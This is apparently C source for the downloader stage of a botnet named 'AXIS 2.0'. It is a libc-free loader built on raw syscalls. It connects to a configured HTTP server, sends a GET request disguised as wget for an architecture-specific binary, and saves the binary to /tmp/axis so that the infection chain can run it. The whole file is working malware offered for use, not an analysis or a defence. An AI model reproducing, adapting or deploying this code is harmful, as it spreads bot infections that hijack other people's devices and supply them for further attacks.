/*
 * Minimal ELF Downloader - Direct syscall implementation
 * AXIS 2.0 Botnet
 * ============================================================================
 * Ultra-small downloader using direct syscalls (no libc)
 * Downloads architecture-specific binary from HTTP server
 * Executes payload for bot infection
 * Size optimized: ~4KB static binary
 * ============================================================================
 */

#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "dlr.h"

/* Syscall numbers for Linux x86_64 */
#ifndef __NR_socket
#define __NR_socket 41
#endif
#ifndef __NR_connect
#define __NR_connect 42
#endif
#ifndef __NR_read
#define __NR_read 0
#endif
#ifndef __NR_write
#define __NR_write 1
#endif
#ifndef __NR_open
#define __NR_open 2
#endif
#ifndef __NR_close
#define __NR_close 3
#endif
#ifndef __NR_exit
#define __NR_exit 60
#endif

/* Direct syscall wrappers */
static int xsocket(int domain, int type, int protocol) {
    return syscall(__NR_socket, domain, type, protocol);
}

static int xconnect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    return syscall(__NR_connect, sockfd, addr, addrlen);
}

static ssize_t xread(int fd, void *buf, size_t count) {
    return syscall(__NR_read, fd, buf, count);
}

static ssize_t xwrite(int fd, const void *buf, size_t count) {
    return syscall(__NR_write, fd, buf, count);
}

static int xopen(const char *pathname, int flags) {
    return syscall(__NR_open, pathname, flags, 0644);
}

static int xclose(int fd) {
    return syscall(__NR_close, fd);
}

static void x_exit(int status) {
    syscall(__NR_exit, status);
}

/* Simple sprintf implementation for minimal environments */
static int xsprintf(char *str, const char *format, ...) {
    va_list args;
    char *p = str;
    const char *f = format;
    int num;
    int i, len;
    char numbuf[32];
    
    va_start(args, format);
    
    while (*f) {
        if (*f == '%') {
            f++;
            if (*f == 's') {
                char *s = va_arg(args, char *);
                while (*s) *p++ = *s++;
            } else if (*f == 'd') {
                num = va_arg(args, int);
                if (num < 0) {
                    *p++ = '-';
                    num = -num;
                }
                len = 0;
                if (num == 0) {
                    numbuf[len++] = '0';
                } else {
                    while (num > 0) {
                        numbuf[len++] = '0' + (num % 10);
                        num /= 10;
                    }
                }
                for (i = len - 1; i >= 0; i--) {
                    *p++ = numbuf[i];
                }
            } else if (*f == 'x') {
                num = va_arg(args, int);
                len = 0;
                if (num == 0) {
                    numbuf[len++] = '0';
                } else {
                    while (num > 0) {
                        int d = num % 16;
                        numbuf[len++] = (d < 10) ? '0' + d : 'a' + (d - 10);
                        num /= 16;
                    }
                }
                for (i = len - 1; i >= 0; i--) {
                    *p++ = numbuf[i];
                }
            } else if (*f == '%') {
                *p++ = '%';
            }
        } else {
            *p++ = *f++;
        }
    }
    *p = '\0';
    va_end(args);
    return p - str;
}

/* Simple memmem implementation */
static void *xmemmem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
    if (needlelen == 0) return (void *)haystack;
    if (haystacklen < needlelen) return NULL;
    
    const char *h = (const char *)haystack;
    const char *n = (const char *)needle;
    
    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (h[i] == n[0] && memcmp(h + i, n, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

/* Get architecture string */
static char *get_arch(void) {
    /* This would normally read from /etc/ or use uname */
    /* For minimal size, we use a simple approach */
    return "unknown";
}

/* Download and execute */
static void run(void) {
    int fd, out;
    struct sockaddr_in addr;
    char buf[1024];
    char request[512];
    char *arch = get_arch();

    /* Create output file */
    out = xopen("/tmp/axis", O_WRONLY | O_CREAT | O_TRUNC);
    if (out == -1) {
        x_exit(1);
    }

    /* Create socket */
    fd = xsocket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        x_exit(1);
    }

    /* Connect to server */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = inet_addr(HTTP_SERVER);

    if (xconnect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        x_exit(1);
    }

    /* Send HTTP GET request */
    int len = 0;
    len += xsprintf(request + len, "GET %s.%s HTTP/1.0\r\n", DLR_PATH, arch);
    len += xsprintf(request + len, "Host: %s\r\n", HTTP_SERVER);
    len += xsprintf(request + len, "User-Agent: wget\r\n");
    len += xsprintf(request + len, "Connection: close\r\n\r\n");

    xwrite(fd, request, len);

    /* Read response and write to file */
    int header_done = 0;
    while (1) {
        int n = xread(fd, buf, sizeof(buf));
        if (n <= 0) break;

        /* Skip HTTP headers */
        if (!header_done) {
            char *body = (char *)xmemmem(buf, n, "\r\n\r\n", 4);
            if (body != NULL) {
                int body_len = n - (body - (char *)buf) - 4;
                if (body_len > 0) {
                    xwrite(out, body + 4, body_len);
                }
                header_done = 1;
            }
        } else {
            xwrite(out, buf, n);
        }
    }

    xclose(fd);
    xclose(out);

    /* Execute downloaded binary */
    /* The caller (shell/loader) will execute it */
    x_exit(0);
}

/* Entry point - no main() to reduce size */
void __attribute__((section(".text"))) _start(void) {
    run();
    x_exit(0);
}
